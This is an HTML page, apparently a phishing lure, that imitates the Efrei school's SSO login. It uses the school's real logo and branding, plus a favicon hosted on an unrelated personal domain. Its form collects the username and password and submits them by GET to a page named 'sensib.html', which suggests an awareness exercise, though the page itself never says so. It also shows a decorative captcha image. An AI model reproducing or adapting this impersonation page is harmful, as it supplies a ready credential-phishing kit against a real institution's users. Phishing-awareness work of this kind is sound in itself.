<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://thibautgenet.fr/assets/efrei-Dc5LUzv4.png" type="image/png">
    <title>Connexion - Efrei</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body, html {
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
        }

        .login-container {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background: url('bg.jpg') no-repeat center center / cover !important;
        }

        .login-box {
            position: relative;
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            z-index: 1;
            transform: translateX(50%); /* Décalage plus important vers la droite */
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }

        p {
            color: #555;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            font-size: 14px;
            color: #333;
            text-align: left;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"] {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        button {
            padding: 10px;
            background-color: #377fbc;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            max-width: 40%;
        }

        button:hover {
            background-color: #0056b3;
        }

        .legal {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
        }

        .legal a {
            color: #007bff;
            text-decoration: none;
        }

        .legal a:hover {
            text-decoration: underline;
        }

        /* Media queries pour responsive */
        @media (max-width: 768px) {
            .login-box {
                max-width: 90%;
                transform: translateX(0); /* Suppression du décalage horizontal sur les petits écrans */
                padding: 20px;
            }

            .logo {
                width: 120px;
            }

            h2 {
                font-size: 20px;
            }

            p {
                font-size: 14px;
            }

            input[type="text"],
            input[type="password"],
            button {
                font-size: 14px;
                padding: 8px;
            }

            .legal {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="background-image"></div>
    <div class="login-box">
        <img src="https://charte.efrei.fr/wp-content/uploads/2022/07/LOGO_EFREI_WEB_bleu.png" alt="Efrei Logo" class="logo">
        <h2>Connexion</h2>
        <p>Utiliser votre compte Efrei</p>
        <form action="sensib.html" method="get">
            <label for="username">Identifiant :</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Mot de passe :</label>
            <input type="password" id="password" name="password" required>
            <p style="font-size: 10px;"><a href="#">Identifiants oubliés ?</a> Contactez-le +33 188 289 250</p>
            <p class="legal">En me connectant, j'accepte les <a href="#">conditions d'utilisations</a> du service SSO Efrei notamment en matière de données personnelles.</p>
            <img src="captcha.png" alt="Captcha" style="width: 50%;"><br />
            <button type="submit">Se connecter</button>
        </form><br />

    </div>
</div>
</body>
</html>
